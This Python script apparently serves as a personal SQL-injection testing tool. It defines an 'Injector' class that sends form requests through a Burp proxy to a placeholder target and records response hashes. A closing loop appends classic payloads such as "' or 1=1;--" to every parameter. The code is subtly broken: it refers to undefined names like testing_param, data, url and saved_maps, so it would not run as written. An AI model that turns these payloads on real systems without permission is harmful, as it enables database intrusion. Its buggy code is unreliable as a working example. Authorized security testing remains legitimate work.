import requests as rex
from bs4 import BeautifulSoup as bs
from urllib.parse import urlencode, quote_plus
import os
from hashlib import md5


class Injector:
    """Request builder for parameter testing, especially SQL injection.

    Stores server responses as hashes to easily see where a different parameter makes a difference.

    Currently built for a specific use case, where the request being tested is a POST request with a url-style body of
    variables. Can be easily fleshed out for other uses.

    """

    def __init__(self):
        # Using with BurpSuite to check the format of requests on their way out
        os.environ['REQUESTS_CA_BUNDLE'] = 'PATH-TO-PEM-ENCODED-CERT'

        self.url = 'URL BEING TESTED'
        self.data = {
            'PARAMETERS': 'BEING TESTED',
        }

        self.hash_map = {}
        self.html_map = {}
        self.saved_maps = {}
        self.testing_param = ''

    def set_url(self, new_url):
        self.url = new_url

    def set_data(self, new_data):
        self.data = new_data

    def set_testing_param(self, new_param):
        self.testing_param = new_param

    def encode_data(self, injection):
        if injection == '':
            request_data = urlencode(self.data)
        else:
            # Put the injected value into the parameter being tested, then return the data in a url encoded string
            # If "plain " is in the injection value, quotes and semicolons won't be encoded
            temp = self.data[testing_param]
            self.data[testing_param] = self.data[testing_param] + injection
            print('new value of ' + testing_param + ': ' + self.data[testing_param])

            if 'plain' in self.data[testing_param]:
                self.data[testing_param] = self.data[testing_param].replace('plain ', '')
                request_data = urlencode(data, quote_via=quote_plus, safe='\"\';')
            else:
                request_data = urlencode(data)

            # Reset value
            self.data[testing_param] = temp

        return request_data

    def make_request(self, injection=''):
        request_data = self.encode_data(injection)

        proxies = {
            # Included here, but you can also move this to __init__ with a session
            'http': '127.0.0.1:8080',
            'https': '127.0.0.1:8080'
        }
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': str(len(request_data)),
            'Cookie': 'If you need to be logged in for these requests, you can grab my login function from this repo'
                      'and use it to log in a session. Or just grab the cookies with DevTools/Burp and include them'
                      'here manually',
        }

        req = rex.post(url=url, data=request_data, proxies=proxies, headers=headers)

        if "Burp" in req.text:
            print('Error occurred in request, or response was dropped')
            print_map()
            print(req.text)
            return False

        soup = bs(req.text, features="html.parser")

        full_hash = md5("".join(req.text.split()).encode('utf-8')).hexdigest()
        text_hash = md5("".join(soup.text.split()).encode('utf-8')).hexdigest()

        self.hash_map[injection] = (full_hash, text_hash)
        self.html_map[injection] = req.text

        return True

    def run_injection(self, injection):
        """Essentially just an alias for make_request.

        Possibly not necessary, could get same results with just modifying values instead of appending some injection
        to the end of them.
        """

        self.make_request(injection)

    def run_modification(self, parameter, new_value):
        """Instead of injecting a value at the end of a """
        original_value = self.data[parameter]
        self.data[parameter] = new_value

        # Now that we've modified the value, we can make_request with no arguments to send off the request.
        self.make_request()

        self.data[parameter] = original_value

    def print_map(self, _map=None):
        if _map is None:
            _map = self.hash_map

        for _key, _val in _map.items():
            if 'html_' in _key:
                # The HTML maps saved here are difficult to read in console. Print them to files instead.
                continue

            if type(_val) is not dict:
                print('{:<30}{}'.format(key, val))
            else:
                print("Map: " + key)
                for sub_key, sub_val in val.items():
                    print('{:<30}{}'.format(sub_key, sub_val))

    def reset(self):
        self.saved_maps['hash_' + testing_param] = self.hash_map.copy()
        self.saved_maps['html_' + testing_param] = self.html_map.copy()

        self.hash_map = {}
        self.html_map = {}


injector = Injector()
testing_param = ''

for key, val in injector.data.items():
    injector.set_testing_param(key)
    print('Now testing ' + key)
    injector.run_injection('')
    injector.run_injection(';--')
    injector.run_injection('";--')
    injector.run_injection("';--")
    injector.run_injection('plain ";--')
    injector.run_injection("plain ';--")
    injector.run_injection('" or 1=1;--')
    injector.run_injection('plain " or 1=1;--')
    injector.run_injection("' or 1=1;--")
    injector.run_injection("plain ' or 1=1;--")
    injector.run_injection('" or "1"="1";--')
    injector.run_injection('plain " or "1"="1";--')
    injector.run_injection("' or '1'='1';--")
    injector.run_injection("plain ' or '1'='1';--")
    reset()

injector.print_map(saved_maps)
